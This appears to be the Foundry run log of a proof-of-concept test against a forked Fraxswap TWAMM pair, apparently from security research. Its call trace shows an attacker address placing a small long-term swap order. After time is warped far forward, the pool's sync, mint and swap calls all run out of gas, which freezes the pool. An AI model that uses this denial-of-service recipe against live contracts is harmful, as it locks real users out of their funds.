@@ -1,0 +1,102 @@
+No files changed, compilation skipped
+
+Ran 1 test for src/test/FraxswapTwammAttackerLifecycleFreshForkPoC.t.sol:FraxswapTwammAttackerLifecycleFreshForkPoC
+[PASS] test_externalAttackerCreatesOrderThenInactivityCausesUserOpsOOG() (gas: 90523506)
+Logs:
+  reserve0: 100505041932678114456
+  reserve1: 106983936568102153668
+  blockTimestampLast: 1679594879
+  lastVirtualOrderTimestamp before attacker: 1679594879
+  elapsed intervals before attacker: 0
+  attacker orderId: 1
+  lastVirtualOrderTimestamp after attacker order: 1679594879
+  elapsed intervals after inactivity: 28076
+  sync after attacker inactivity ok: 0
+  mint after attacker inactivity ok: 0
+  swap after attacker inactivity ok: 0
+
+Traces:
+  [90645706] FraxswapTwammAttackerLifecycleFreshForkPoC::test_externalAttackerCreatesOrderThenInactivityCausesUserOpsOOG()
+    ├─ [2400] FraxswapPair::newSwapsPaused() [staticcall]
+    │   └─ ← [Return] false
+    ├─ [2402] FraxswapPair::token1() [staticcall]
+    │   └─ ← [Return] FRAXStablecoin: [0x853d955aCEf822Db058eb8505911ED77F175b99e]
+    ├─ [2470] FraxswapPair::getReserves() [staticcall]
+    │   └─ ← [Return] 100505041932678114456 [1.005e20], 106983936568102153668 [1.069e20], 1679594879 [1.679e9]
+    ├─ emit log_named_uint(key: "reserve0", val: 100505041932678114456 [1.005e20])
+    ├─ emit log_named_uint(key: "reserve1", val: 106983936568102153668 [1.069e20])
+    ├─ emit log_named_uint(key: "blockTimestampLast", val: 1679594879 [1.679e9])
+    ├─ [10879] FraxswapPair::getTwammState() [staticcall]
+    │   └─ ← [Return] 0, 0, 1679594879 [1.679e9], 3600, 0, 31483919550579051809204422509363267601 [3.148e37]
+    ├─ emit log_named_uint(key: "lastVirtualOrderTimestamp before attacker", val: 1679594879 [1.679e9])
+    ├─ emit log_named_uint(key: "elapsed intervals before attacker", val: 0)
+    ├─ [2666] FRAXStablecoin::balanceOf(0x00000000000000000000000000000000000A11cE) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::record()
+    │   └─ ← [Return]
+    ├─ [666] FRAXStablecoin::balanceOf(0x00000000000000000000000000000000000A11cE) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::accesses(FRAXStablecoin: [0x853d955aCEf822Db058eb8505911ED77F175b99e]) [staticcall]
+    │   └─ ← [Return] [0x9ee878158fd03ad640d4a0705a30c697ca9fe067e51ec5dde8bf6b55f41c298c], []
+    ├─ [0] VM::load(FRAXStablecoin: [0x853d955aCEf822Db058eb8505911ED77F175b99e], 0x9ee878158fd03ad640d4a0705a30c697ca9fe067e51ec5dde8bf6b55f41c298c) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ emit WARNING_UninitedSlot(who: FRAXStablecoin: [0x853d955aCEf822Db058eb8505911ED77F175b99e], slot: 71876167386050487898146830022186005123451842624267182249246330889465086355852 [7.187e76])
+    ├─ [0] VM::load(FRAXStablecoin: [0x853d955aCEf822Db058eb8505911ED77F175b99e], 0x9ee878158fd03ad640d4a0705a30c697ca9fe067e51ec5dde8bf6b55f41c298c) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ [666] FRAXStablecoin::balanceOf(0x00000000000000000000000000000000000A11cE) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::store(FRAXStablecoin: [0x853d955aCEf822Db058eb8505911ED77F175b99e], 0x9ee878158fd03ad640d4a0705a30c697ca9fe067e51ec5dde8bf6b55f41c298c, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
+    │   └─ ← [Return]
+    ├─ [666] FRAXStablecoin::balanceOf(0x00000000000000000000000000000000000A11cE) [staticcall]
+    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
+    ├─ [0] VM::store(FRAXStablecoin: [0x853d955aCEf822Db058eb8505911ED77F175b99e], 0x9ee878158fd03ad640d4a0705a30c697ca9fe067e51ec5dde8bf6b55f41c298c, 0x0000000000000000000000000000000000000000000000000000000000000000)
+    │   └─ ← [Return]
+    ├─ emit SlotFound(who: FRAXStablecoin: [0x853d955aCEf822Db058eb8505911ED77F175b99e], fsig: 0x70a08231, keysHash: 0x9ee878158fd03ad640d4a0705a30c697ca9fe067e51ec5dde8bf6b55f41c298c, slot: 71876167386050487898146830022186005123451842624267182249246330889465086355852 [7.187e76])
+    ├─ [0] VM::load(FRAXStablecoin: [0x853d955aCEf822Db058eb8505911ED77F175b99e], 0x9ee878158fd03ad640d4a0705a30c697ca9fe067e51ec5dde8bf6b55f41c298c) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ [0] VM::store(FRAXStablecoin: [0x853d955aCEf822Db058eb8505911ED77F175b99e], 0x9ee878158fd03ad640d4a0705a30c697ca9fe067e51ec5dde8bf6b55f41c298c, 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000)
+    │   └─ ← [Return]
+    ├─ [666] FRAXStablecoin::balanceOf(0x00000000000000000000000000000000000A11cE) [staticcall]
+    │   └─ ← [Return] 1000000000000000000 [1e18]
+    ├─ [0] VM::startPrank(0x00000000000000000000000000000000000A11cE)
+    │   └─ ← [Return]
+    ├─ [24733] FRAXStablecoin::approve(FraxswapPair: [0xd79886841026a39cFF99321140B3c4D31314782B], 1000000000000000000 [1e18])
+    │   ├─ emit Approval(owner: 0x00000000000000000000000000000000000A11cE, spender: FraxswapPair: [0xd79886841026a39cFF99321140B3c4D31314782B], amount: 1000000000000000000 [1e18])
+    │   └─ ← [Return] true
+    ├─ [347745] FraxswapPair::longTermSwapFrom1To0(1000000000000000000 [1e18], 1)
+    │   ├─ [2666] FRAXStablecoin::balanceOf(FraxswapPair: [0xd79886841026a39cFF99321140B3c4D31314782B]) [staticcall]
+    │   │   └─ ← [Return] 106983936568102153669 [1.069e20]
+    │   ├─ [8974] FRAXStablecoin::transferFrom(0x00000000000000000000000000000000000A11cE, FraxswapPair: [0xd79886841026a39cFF99321140B3c4D31314782B], 1000000000000000000 [1e18])
+    │   │   ├─ emit Transfer(from: 0x00000000000000000000000000000000000A11cE, to: FraxswapPair: [0xd79886841026a39cFF99321140B3c4D31314782B], amount: 1000000000000000000 [1e18])
+    │   │   ├─ emit Approval(owner: 0x00000000000000000000000000000000000A11cE, spender: FraxswapPair: [0xd79886841026a39cFF99321140B3c4D31314782B], amount: 0)
+    │   │   └─ ← [Return] true
+    │   ├─ [666] FRAXStablecoin::balanceOf(FraxswapPair: [0xd79886841026a39cFF99321140B3c4D31314782B]) [staticcall]
+    │   │   └─ ← [Return] 107983936568102153669 [1.079e20]
+    │   ├─ emit LongTermSwap1To0(addr: 0x00000000000000000000000000000000000A11cE, orderId: 1, amount1In: 1000000000000000000 [1e18], numberOfTimeIntervals: 1)
+    │   └─ ← [Return] 1
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ emit log_named_uint(key: "attacker orderId", val: 1)
+    ├─ [879] FraxswapPair::getTwammState() [staticcall]
+    │   └─ ← [Return] 0, 148787382829936021425 [1.487e20], 1679594879 [1.679e9], 3600, 0, 31483919550579051809204422509363267601 [3.148e37]
+    ├─ emit log_named_uint(key: "lastVirtualOrderTimestamp after attacker order", val: 1679594879 [1.679e9])
+    ├─ [0] VM::warp(1780668479 [1.78e9])
+    │   └─ ← [Return]
+    ├─ emit log_named_uint(key: "elapsed intervals after inactivity", val: 28076 [2.807e4])
+    ├─ [30000000] FraxswapPair::sync()
+    │   ├─ emit VirtualOrderExecution(blockTimestamp: 1679601600 [1.679e9], blockTimestampElapsed: 6721, newReserve0: 99574762321245691390 [9.957e19], newReserve1: 107983936568102153667 [1.079e20], newTwammReserve0: 930279611432423067 [9.302e17], newTwammReserve1: 2, token0Bought: 930279611432423066 [9.302e17], token1Bought: 0, token0Sold: 0, token1Sold: 999999999999999999 [9.999e17])
+    │   └─ ← [OutOfGas] EvmError: OutOfGas
+    ├─ [30000000] FraxswapPair::mint(0x000000000000000000000000000000000000cafE)
+    │   ├─ emit VirtualOrderExecution(blockTimestamp: 1679601600 [1.679e9], blockTimestampElapsed: 6721, newReserve0: 99574762321245691390 [9.957e19], newReserve1: 107983936568102153667 [1.079e20], newTwammReserve0: 930279611432423067 [9.302e17], newTwammReserve1: 2, token0Bought: 930279611432423066 [9.302e17], token1Bought: 0, token0Sold: 0, token1Sold: 999999999999999999 [9.999e17])
+    │   └─ ← [OutOfGas] EvmError: OutOfGas
+    ├─ [30000000] FraxswapPair::swap(1, 0, 0x000000000000000000000000000000000000bEEF, 0x)
+    │   ├─ emit VirtualOrderExecution(blockTimestamp: 1679601600 [1.679e9], blockTimestampElapsed: 6721, newReserve0: 99574762321245691390 [9.957e19], newReserve1: 107983936568102153667 [1.079e20], newTwammReserve0: 930279611432423067 [9.302e17], newTwammReserve1: 2, token0Bought: 930279611432423066 [9.302e17], token1Bought: 0, token0Sold: 0, token1Sold: 999999999999999999 [9.999e17])
+    │   └─ ← [OutOfGas] EvmError: OutOfGas
+    ├─ emit log_named_uint(key: "sync after attacker inactivity ok", val: 0)
+    ├─ emit log_named_uint(key: "mint after attacker inactivity ok", val: 0)
+    ├─ emit log_named_uint(key: "swap after attacker inactivity ok", val: 0)
+    └─ ← [Return]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 810.42s (810.42s CPU time)
+
+Ran 1 test suite in 812.12s (810.42s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
